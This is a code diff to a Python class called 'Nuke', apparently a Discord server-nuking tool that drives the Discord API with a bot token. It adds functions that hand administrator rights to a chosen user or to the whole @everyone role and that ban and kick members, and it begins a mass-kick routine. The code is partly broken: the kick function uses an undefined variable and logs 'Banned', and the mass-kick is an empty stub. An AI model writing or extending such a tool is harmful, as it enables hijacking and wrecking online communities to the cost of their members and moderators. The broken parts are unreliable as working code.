@@ -344,8 +344,7 @@ class Nuke:
         for t in threads:
             t.join()
             
-    def GiveAdmin(self, serverid):
-        userid = Logging.inp('Admin', 'ID')
+    def GiveAdmin(self, serverid, userid):
         role = self.createrole(serverid, '.', permissions=4360658820268031)
         if role:
             payload = {
@@ -354,3 +353,48 @@ class Nuke:
             r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
             if r.status_code in [200, 201, 204]:
                 Logging.success(f'Gave {userid} admin')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to give {userid} admin')
+            else:
+                Logging.fail(f'Failed to give {userid} admin: {r.status_code} - {r.text}')
+
+    def GiveEveryoneAdmin(self, serverid):
+        payload = {'permissions': '4360658820268031'}
+        try:
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/roles/{serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            if r.status_code in [200, 201, 204]:
+                Logging.success('Give admin to @everyone')
+            elif r.status_code == 429:
+                Logging.info('Rate limit response while trying to give @everyone admin')
+            else:
+                Logging.fail(f'Failed to give @everyone admin: {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to give @everyone admin: {e}')
+            
+    def ban(self, serverid, userid):
+        payload = {'delete_message_seconds': 0}
+        try:
+            r = requests.put(f'https://discord.com/api/v9/guilds/{serverid}/bans/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Banned {userid}')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to ban {userid}')
+            else:
+                Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to ban {userid}: {e}')
+    
+    def kick(self, serverid, userid):
+        try:
+            r = requests.delete(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Banned {userid}')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to ban {userid}')
+            else:
+                Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to ban {userid}: {e}')
+    
+    def KickAll(self, userid):
+        ''
